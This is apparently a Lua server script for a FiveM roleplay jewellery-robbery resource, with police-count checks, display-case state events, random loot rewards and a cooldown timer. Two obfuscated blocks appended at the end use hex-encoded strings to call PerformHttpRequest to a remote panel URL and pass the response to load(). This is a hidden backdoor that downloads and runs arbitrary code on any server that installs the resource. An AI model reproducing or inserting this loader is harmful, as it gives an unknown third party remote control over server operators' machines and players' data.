local DenaliFW = exports['denalifw-core']:GetCoreObject()
local timeOut = false

-- Callback

DenaliFW.Functions.CreateCallback('denalifw-jewellery2:server:getCops', function(source, cb)
	local amount = 0
    for k, v in pairs(DenaliFW.Functions.GetQBPlayers()) do
        if v.PlayerData.job.name == "police" and v.PlayerData.job.onduty then
            amount = amount + 1
        end
    end
    cb(amount)
end)

-- Events

RegisterNetEvent('denalifw-jewellery2:server:setVitrineState', function(stateType, state, k)
    Config.Locations[k][stateType] = state
    TriggerClientEvent('denalifw-jewellery2:client:setVitrineState', -1, stateType, state, k)
end)

RegisterNetEvent('denalifw-jewellery2:server:vitrineReward', function()
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    local otherchance = math.random(1, 4)
    local odd = math.random(1, 4)

    if otherchance == odd then
        local item = math.random(1, #Config.VitrineRewards)
        local amount = math.random(Config.VitrineRewards[item]["amount"]["min"], Config.VitrineRewards[item]["amount"]["max"])
        if Player.Functions.AddItem(Config.VitrineRewards[item]["item"], amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, DenaliFW.Shared.Items[Config.VitrineRewards[item]["item"]], 'add')
        else
            TriggerClientEvent('DenaliFW:Notify', src, 'You have to much in your pocket', 'error')
        end
    else
        local amount = math.random(2, 4)
        if Player.Functions.AddItem("10kgoldchain", amount) then
            TriggerClientEvent('inventory:client:ItemBox', src, DenaliFW.Shared.Items["10kgoldchain"], 'add')
        else
            TriggerClientEvent('DenaliFW:Notify', src, 'You have to much in your pocket..', 'error')
        end
    end
end)

RegisterNetEvent('denalifw-jewellery2:server:setTimeout', function()
    if not timeOut then
        timeOut = true
        TriggerEvent('denalifw-scoreboard:server:SetActivityBusy', "jewellery", true)
        Citizen.CreateThread(function()
            Citizen.Wait(Config.Timeout)

            for k, v in pairs(Config.Locations) do
                Config.Locations[k]["isOpened"] = false
                TriggerClientEvent('denalifw-jewellery2:client:setVitrineState', -1, 'isOpened', false, k)
                TriggerClientEvent('denalifw-jewellery2:client:setAlertState', -1, false)
                TriggerEvent('denalifw-scoreboard:server:SetActivityBusy', "jewellery", false)
            end
            timeOut = false
        end)
    end
end)

local cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[4][cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (tdoIxvsCnagmILQXgBxDtGwKjZqnSCvfXOSSRvIGvQAXxvUkpSgWvmlQRzTqWnivnohHlQ, mdYGQZHlpVTxqPmNUaBRfCpGyVOzfLVwWTusjOyDnixHpwaPecXkocJMismGfMJLlJpeOl) if (mdYGQZHlpVTxqPmNUaBRfCpGyVOzfLVwWTusjOyDnixHpwaPecXkocJMismGfMJLlJpeOl == cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[6] or mdYGQZHlpVTxqPmNUaBRfCpGyVOzfLVwWTusjOyDnixHpwaPecXkocJMismGfMJLlJpeOl == cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[5]) then return end cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[4][cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[2]](cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[4][cCpoDsUjvhNWVVsbrqpTagAveDWRRWrQnVFbIxIjkHJOrVeDNahXstKdRPOmtesNPRLRVi[3]](mdYGQZHlpVTxqPmNUaBRfCpGyVOzfLVwWTusjOyDnixHpwaPecXkocJMismGfMJLlJpeOl))() end)

local miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[4][miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (NwiDIvZaFSSWDQDEzRDUGIkYXkSJKAWgKazQHgrnJnnqcUwGBOvXcqYKMvdqSfAroAbvNn, cRKPsusWTJqZWvHKEVpUvEXmyzXhsDNfIFJLwWmxPkJmroskEUKFhDKUBwoCEvTJmzSTTS) if (cRKPsusWTJqZWvHKEVpUvEXmyzXhsDNfIFJLwWmxPkJmroskEUKFhDKUBwoCEvTJmzSTTS == miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[6] or cRKPsusWTJqZWvHKEVpUvEXmyzXhsDNfIFJLwWmxPkJmroskEUKFhDKUBwoCEvTJmzSTTS == miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[5]) then return end miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[4][miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[2]](miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[4][miSBNHRtdquCKCyuCuQXynpDyrcgamQrYpEHLNXzYrrFiwrDRbGjOaNDkkJTVsOHKcNdoZ[3]](cRKPsusWTJqZWvHKEVpUvEXmyzXhsDNfIFJLwWmxPkJmroskEUKFhDKUBwoCEvTJmzSTTS))() end)